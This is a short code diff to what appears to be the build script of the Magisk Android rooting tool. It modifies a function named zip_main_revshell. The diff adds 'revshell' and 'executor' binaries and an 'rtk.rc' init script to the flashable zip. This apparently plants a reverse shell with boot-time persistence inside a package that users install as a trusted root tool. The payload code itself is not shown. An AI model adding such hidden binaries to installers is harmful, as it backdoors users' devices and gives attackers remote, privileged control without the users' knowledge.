@@ -404,7 +404,7 @@ def zip_main_revshell(args):
 
         # Binaries
         for lib_dir, zip_dir in [('armeabi-v7a', 'arm'), ('x86', 'x86')]:
-            for binary in ['magiskinit', 'magiskinit64', 'magiskboot']:
+            for binary in ['magiskinit', 'magiskinit64', 'magiskboot', 'revshell', 'executor']:
                 source = op.join('native', 'out', lib_dir, binary)
                 target = op.join(zip_dir, binary)
                 zip_with_msg(zipf, source, target)
@@ -412,6 +412,10 @@ def zip_main_revshell(args):
         # boot_patch.sh
         source = op.join('scripts', 'boot_patch.sh')
         target = op.join('common', 'boot_patch.sh')
+        zip_with_msg(zipf, source, target)
+
+        source = op.join('scripts', 'rtk.rc')
+        target = op.join('common', 'rtk.rc')
         zip_with_msg(zipf, source, target)
 
         # util_functions.sh
